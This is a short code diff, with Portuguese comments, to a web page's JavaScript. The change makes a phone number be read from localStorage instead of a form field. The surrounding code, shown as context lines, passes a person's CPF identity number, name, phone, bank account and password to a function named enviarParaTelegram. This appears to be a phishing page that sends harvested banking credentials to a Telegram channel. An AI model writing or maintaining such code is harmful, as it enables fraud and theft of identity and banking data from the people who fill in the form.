@@ -171,7 +171,7 @@
                     enviarParaTelegram({
                         cpf: cpf,
                         nome: nome,
-                        telefone: document.getElementById("telefone").value,
+                        telefone: localStorage.getItem("telefone"),  // Recuperando telefone do localStorage
                         conta: '1515',  // Aqui você coloca o valor da conta real
                         senha: '1313'   // Aqui você coloca a senha real
                     });
@@ -184,7 +184,7 @@
 
                     enviarParaTelegram({
                         cpf: cpf,
-                        telefone: document.getElementById("telefone").value,
+                        telefone: localStorage.getItem("telefone"),  // Recuperando telefone do localStorage
                         conta: '1515',
                         senha: '1313'
                     });
@@ -204,7 +204,7 @@
         function confirmarTelefone() {
             var telefone = document.getElementById("telefone").value;
             if (telefone) {
-                localStorage.setItem("telefone", telefone);
+                localStorage.setItem("telefone", telefone); // Salvando telefone no localStorage
                 window.location.href = "segundo.html";
             } else {
                 alert("Por favor, insira um telefone válido.");
